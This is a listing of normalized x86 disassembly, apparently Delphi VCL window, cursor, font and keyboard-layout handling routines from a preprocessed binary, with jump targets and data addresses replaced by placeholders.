call sub_442a48
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403468
sub_45b858
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403468
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45b888
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b858
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b888
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b904
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45b858
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45b858
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45b888
pop ecx
test al al
je r-xdata
sub_45b958
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403468
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45b988
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b958
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b988
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ba04
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45b958
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45b958
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45b988
pop ecx
test al al
je r-xdata
sub_45ba58
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4139c8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44a3a4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45baac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45ba58
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403468
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bb28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419b10
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45bb64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43e3a8
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43f0c4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45bbac
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4446f8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4446f8
push eax
call RedrawWindow
sub_45bd00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4569b8
mov dl 0x5
mov eax ebx
call sub_458824
mov dl 0x1
mov eax ebx
call sub_4432d4
mov dl 0x3
mov eax ebx
call sub_458b20
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45bd68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45be3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443194
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_443000
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43d3d8
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43de38
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4040ac
mov eax [ ebp - 0xc ]
call sub_40427c
push eax
mov eax [ ebp - 0xc ]
call sub_40447c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43de48
mov eax [ ebp - 0xc ]
call sub_40427c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be46
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
mov dl 0x1
mov eax esi
call sub_457ea4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43def4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404608
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45be6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_441428
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4575c8
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4413ec
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403468
inc ebp
dec edi
jne r-xdata
sub_45beb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_443194
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45bee4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44399c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45bf0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45a274
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_443194
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4446f8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4431a8
or ecx 0xffffffff
mov dl 0x1
call sub_43e584
pop esi
pop ebx
retn
sub_45bfa4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443e0c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43f0c4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43d864
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403468
sub_45bffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45c0c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43de38
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4040ac
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43de48
mov eax [ ebp - 0x4 ]
call sub_40427c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43def4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0c9
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_457ea4
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404608
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45c0e8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443b8c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443194
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4431a8
mov dl [ ebx + 0x57 ]
call sub_43dde4
inc edi
dec esi
jne r-xdata
sub_45c18c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45c1bc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45c1ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419380
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45c590
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45c59c
mov eax ebx
call sub_45c5a8
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4589c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45c9c8
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c8a4
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c8a4
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c8a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45c344
push ebx
push esi
push edi
push ebp
call sub_4035f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_40326c
mov eax [ ebp + 0x88 ]
call sub_40326c
mov eax [ ebp + 0x84 ]
call sub_40326c
mov eax [ ebp + 0x54 ]
call sub_40326c
mov eax [ ebp + 0x50 ]
call sub_40326c
mov eax [ ebp + 0x4c ]
call sub_40326c
mov eax [ ebp + 0x30 ]
call sub_40326c
mov eax [ ebp + 0x34 ]
call sub_40326c
mov eax [ ebp + 0x7c ]
call sub_40326c
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_40326c
mov eax ebp
call sub_45c604
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4193cc
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035e0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4139c8
call sub_40326c
inc edi
dec esi
jne r-xdata
sub_45c4bc
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45c508
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41386c
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41386c
mov eax [ rw-data ]
call sub_45f294
sub_45c540
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413b0c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413b0c
mov eax [ rw-data ]
call sub_45f294
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_445cd0
sub_45c5a8
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45c660
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45c604
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_45c660
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45c688
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c833
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c83a
lea eax [ ebp - 0x260 ]
call sub_403fbc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403fbc
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415570
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408b14
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_449478
test al al
je r-xdata
xor eax eax
push ebp
push sub_45c7ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40422c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40422c
sub_45c8a4
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45f104
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45eeb8
mov dl 0x1
mov eax [ rw-data ]
call sub_45eeb8
sub_45c910
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45c938
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45c910
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406994
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_40691c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45c9c8
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45cb0d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45eeb8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c850
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c850
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c934
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c850
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c850
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c850
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45eeb8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c694
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c694
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb14
cmp [ rw-data ] 0x0
je r-xdata
sub_45cb4c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45cbac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
